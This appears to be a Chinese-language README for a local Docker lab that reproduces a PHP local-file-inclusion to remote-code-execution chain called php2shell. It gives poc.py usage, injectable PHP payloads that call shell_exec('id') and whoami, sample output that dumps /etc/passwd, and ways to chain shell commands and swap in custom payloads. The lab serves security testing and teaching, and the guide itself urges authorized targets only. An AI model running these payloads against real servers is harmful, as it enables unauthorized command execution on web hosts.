## 1. 环境要求

| 依赖 | 版本要求 | 说明 |
|------|----------|------|
| Docker | 任意较新版本（含 Docker Compose v2） | 用于跑靶场容器 |
| Python | 3.7+ | 用于跑 `poc.py`（只用标准库，无需 pip 安装任何东西） |
| 磁盘 / 内存 | 空闲即可 | 镜像约几百 MB |

- **Windows**：装 [Docker Desktop](https://www.docker.com/products/docker-desktop/)，并确保它处于运行状态（右下角鲸鱼图标正常）。
- **macOS / Linux**：装 Docker Engine + Docker Compose 即可。

## 2. 安装 Docker 与 Python

### 2.1 Docker

- Windows/macOS：下载安装 Docker Desktop，安装后启动，等它显示「Engine running」。
- Linux：`sudo apt install docker.io docker-compose-v2`（或按发行版文档）。

验证：

```bash
docker --version
docker compose version
```

### 2.2 Python

- Windows：从 [python.org](https://www.python.org/downloads/) 下载安装，**勾选「Add Python to PATH」**。
- macOS/Linux：一般自带 `python3`。

验证：

```bash
python --version        # Windows
python3 --version       # macOS/Linux（下面命令把 python 换成 python3 即可）
```

> `poc.py` 只用 `argparse`、`random`、`string`、`urllib` 这些**标准库**，不需要 `pip install`。

## 3. 启动靶场

进入项目目录（本仓库根目录），执行：

```bash
docker compose up -d --build
```

预期输出末尾类似：

```
 Image lab-php2shell Built
 Container lab-php2shell-1 Started
```

确认容器在跑：

```bash
docker ps
```

应能看到一行：

```
lab-php2shell-1   ...   0.0.0.0:8082->80/tcp
```

浏览器打开 <http://localhost:8082/>，能看到「php2shell Chain A 演示」页面，即启动成功。

> 这个页面本身就是一个故意留了 LFI 的脆弱应用：`?page=/任意路径` 会 `include` 该路径。

## 4. 复现漏洞

### 4.1 默认「展示载荷」

```bash
python poc.py --target http://localhost:8082
```

预期输出：

```
[1] 已注入，会话文件应为 /tmp/sessions/sess_xxxxxxxxxxxxxxxxxxxxxxxxxx
[2] LFI 包含并执行: http://localhost:8082/index.php?page=/tmp/sessions/sess_xxx

uid=33(www-data) gid=33(www-data) groups=33(www-data)
=== WHOAMI ===
www-data
=== UNAME ===
Linux a3ab81efaa32 6.18.54.1-microsoft-standard-WSL2 ... x86_64 GNU/Linux
=== PASSWD ===
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

看到 `uid=33(www-data)` 就说明**命令执行成功**，且身份是 web 用户 `www-data`。

### 4.2 只跑一条自定义命令

```bash
python poc.py --target http://localhost:8082 --cmd "whoami"
python poc.py --target http://localhost:8082 --cmd "id"
python poc.py --target http://localhost:8082 --cmd "uname -a"
```

预期输出（以 `--cmd whoami` 为例）：

```
www-data
```

### 4.3 一次跑多条命令

`--cmd` 交给 `/bin/sh -c` 执行，所以可以用 `;` 连接多条：

```bash
python poc.py --target http://localhost:8082 --cmd "id; whoami; pwd"
```

### 4.4 用浏览器看

`poc.py` 的默认载荷用 `PHP_EOL` 输出换行，适合在**终端**里看。想在**浏览器**里看换行，两种改法：

- **改法一**：把载荷里的 `.PHP_EOL` 换成 `. '<br>'`（浏览器把 `<br>` 渲染成换行）；
- **改法二**：用 `<pre>` 包住输出（`<pre>` 会保留换行）。

对应到 `poc.py` 里就是改 `SHOWCASE_PAYLOAD` 这一段：

```python
SHOWCASE_PAYLOAD = (
    "<?php "
    "echo '<pre>'; "                                    # ← 加这个
    "echo '=== ID ===' . '<br>'; echo shell_exec('id'); "
    "echo '=== WHOAMI ===' . '<br>'; echo shell_exec('whoami'); "
    "echo '</pre>'; "                                   # ← 加这个
    "die(); ?>"
)
```

改完重新跑 `poc.py`，然后把第 `[2]` 步打印出来的 URL 复制到浏览器打开即可看到带换行的页面。

## 5. 自定义玩法

### 5.1 改端口

编辑 `docker-compose.yml`：

```yaml
services:
  php2shell:
    build: .
    ports:
      - "18082:80"      # ← 把 8082 改成你想要的端口
```

然后：

```bash
docker compose up -d
python poc.py --target http://localhost:18082
```

### 5.2 改默认载荷

编辑 `poc.py` 里的 `SHOWCASE_PAYLOAD`，把它换成你想注入的任何 PHP 代码。例如只想证明代码执行：

```python
SHOWCASE_PAYLOAD = "<?php echo 'PWNED_' . md5('x'); die(); ?>"
```

> 载荷里尽量用**单引号**（因为 `filename` 外层是双引号包着的，写双引号会截断）；必须写成一整行（换行会截断 multipart 头）。

### 5.3 换一个更真实的 PHP 版本

`Dockerfile` 第一行固定了 `php:8.2.34-apache`（受影响）。想验证「修复版不受影响」，可临时改成 `php:8.2.35-apache` 重build，再用 `poc.py` 复现，对比差异。

## 6. 停止与清理

```bash
# 停止（保留镜像，下次 up 很快）
docker compose down

# 停止并删除镜像（彻底清理）
docker compose down --rmi all

# 只删容器不删镜像
docker compose rm -f
```

如果换过端口或想彻底重来：

```bash
docker compose down --rmi all
docker compose up -d --build
```

## 7. 常见问题 FAQ

### Q1：`docker compose up` 报端口被占用

```
Bind for 0.0.0.0:8082 failed: port is already allocated
```

8082 被别的程序占了。两种办法：
- 改 `docker-compose.yml` 的端口（见 5.1）；
- 找到占用进程并停掉：`docker ps` 看有没有别的容器用了 8082，`docker rm -f 容器名`。

### Q2：构建报 `/app not found`

```
failed to solve: ... "/app": not found
```

`app/` 目录被误删了（`Dockerfile` 里有 `COPY app/ ...`）。确认 `app/index.php` 存在，再 `docker compose up -d --build`。

### Q3：输出中文乱码（`��` 之类）

这是 Windows 终端编码问题（终端 GBK、程序输出 UTF-8），**不影响漏洞本身**。解决：

```powershell
chcp 65001
$env:PYTHONIOENCODING = "utf-8"
python poc.py --target http://localhost:8082
```

（`id`、`whoami` 等 ASCII 输出本来就正常，只有中文提示会乱。）

### Q4：`poc.py` 卡住 / 连接超时

- 确认容器在跑：`docker ps`；
- 确认端口对：默认 `8082`；
- 确认没有代理干扰：如有 `HTTP_PROXY` 环境变量，可 `set HTTP_PROXY=` 临时关掉。

### Q5：为什么拿到的是 www-data，不是 root？

php2shell 给的是 **web 运行用户**（本靶场是 Apache 的 `www-data`），不是 root。从 www-data 到 root 需要额外的本地提权漏洞，那是另一类问题。详见 [原理分析.md](原理分析.md) 的「关于权限」一节。

### Q6：怎么证明「这站确实有这个漏洞」而不是误报？

`poc.py` 能稳定执行你注入的 PHP（比如 `id`、`whoami` 返回真实命令结果），本身就是 RCE 的铁证。真实授权测试里，推荐先用 **只读、无破坏** 的载荷（如 `phpinfo()`、`echo md5('x')`）做无害验证，再决定是否进一步。

### Q7：我想在真实博客上自测，为什么 403 / 没反应？

生产环境通常有 WAF、CDN、UA 校验，或干脆是静态站，行为会和本地靶场不一样。请只在你有授权的目标上测试，并优先考虑「无害验证载荷」。
